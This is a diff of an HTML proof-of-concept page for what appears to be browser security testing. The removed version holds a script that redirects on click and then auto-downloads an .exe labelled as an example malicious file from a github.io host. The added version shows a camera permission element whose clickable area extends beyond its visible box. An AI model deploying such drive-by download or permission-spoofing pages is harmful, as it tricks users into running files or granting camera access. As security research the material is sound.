@@ -1,46 +1,50 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Delayed File Download PoC</title>
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: sans-serif;
-      background-color: #fafafa;
-      cursor: pointer;
-      user-select: none;
-    }
-    h1 {
-      color: #333;
-      text-align: center;
-      max-width: 400px;
-      padding: 20px;
-    }
-  </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  background: #000;
+  color: white;
+  font-family: -apple-system, system-ui, sans-serif;
+  padding: 40px;
+}
+
+/* Wrapper to show expected boundary */
+.box {
+  width: 220px;
+  height: 60px;
+  border: 2px dashed red;
+  margin-bottom: 40px;
+}
+
+/* Malformed permission styling */
+permission[type="camera"] {
+  display: block;
+  border-bottom: 100mm solid rgb(32,32,32);
+  border-top-left-radius: 99999px;
+  border-top-right-radius: 99999px;
+  background: #222;
+}
+</style>
 </head>
+
 <body>
-  <h1>Click anywhere to trigger file download after delay.</h1>
 
-  <script>
-    document.addEventListener('click', async () => {
-      // After user clicks, redirect to a "trusted" site (this simulates the delay)
-      window.location.href = 'https://www.google.com'; // Redirect to Google
+<h3>Expected clickable area = red box</h3>
 
-      setTimeout(() => {
-        // After 5 seconds, try to trigger download
-        const link = document.createElement('a');
-        link.href = 'https://ecdnts-del.github.io/test-apk/chromeIOS.exe'; // Example malicious file
-        link.download = 'test-malicious-file.exe'; // File name for download
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      }, 5000); // 5 seconds delay before download starts
-    });
-  </script>
+<div class="box">
+  <permission type="camera">
+    Camera permission
+  </permission>
+</div>
+
+<p>
+The clickable / visible area of the permission control extends
+outside its visual container.
+</p>
+
 </body>
 </html>
